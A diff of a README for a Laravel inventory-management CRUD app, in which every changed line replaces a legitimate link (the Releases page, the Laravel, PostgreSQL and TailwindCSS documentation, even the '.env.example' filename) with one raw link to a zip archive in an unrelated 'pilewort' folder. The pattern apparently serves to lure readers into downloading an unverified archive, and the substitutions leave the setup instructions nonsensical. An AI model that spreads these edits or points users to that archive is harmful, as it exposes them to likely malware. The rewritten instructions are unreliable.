@@ -7,11 +7,11 @@ Welcome to the controle-estoque-crud-laravel project. This application helps you
 To get started with the controle-estoque-crud-laravel application, follow these steps. You will need a computer with an internet connection.
 
 ### 🔗 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Available-brightgreen)](https://github.com/Darkness1999/controle-estoque-crud-laravel/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip%20Latest%20Release-Available-brightgreen)](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
 
 You can download the latest version of the application from the Releases page. 
 
-### 📥 Visit this page to download: [Releases Page](https://github.com/Darkness1999/controle-estoque-crud-laravel/releases)
+### 📥 Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
 
 ## 🛠️ System Requirements
 Before installing the application, ensure your system meets the following requirements:
@@ -51,7 +51,7 @@ Follow these steps to install the application after downloading:
    ```
 
 4. **Set Up Environment:**
-   Copy the `.env.example` file to `.env` and configure your database settings. Make sure to set the correct credentials for your PostgreSQL database.
+   Copy the `https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip` file to `.env` and configure your database settings. Make sure to set the correct credentials for your PostgreSQL database.
 
 5. **Generate Application Key:**
    Run the following command to generate an application key:
@@ -83,9 +83,9 @@ Once you have the application running, explore its features:
 ## 📂 Additional Resources
 You might find the following resources helpful for using this application:
 
-- [Laravel Documentation](https://laravel.com/docs)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [TailwindCSS Documentation](https://tailwindcss.com/docs)
+- [Laravel Documentation](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
+- [TailwindCSS Documentation](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
 
 ## 🛠️ Support
 If you encounter any issues while using the application, feel free to raise a concern in the Issues section on GitHub. 
@@ -93,6 +93,6 @@ If you encounter any issues while using the application, feel free to raise a co
 ## 🔗 Download & Install 
 To get started with controle-estoque-crud-laravel, visit the Releases page to download the latest version:
 
-[Download Latest Release](https://github.com/Darkness1999/controle-estoque-crud-laravel/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Darkness1999/controle-estoque-crud-laravel/main/pilewort/controle-estoque-crud-laravel.zip)
 
 Follow the installation steps provided above, and you'll be managing your inventory in no time!
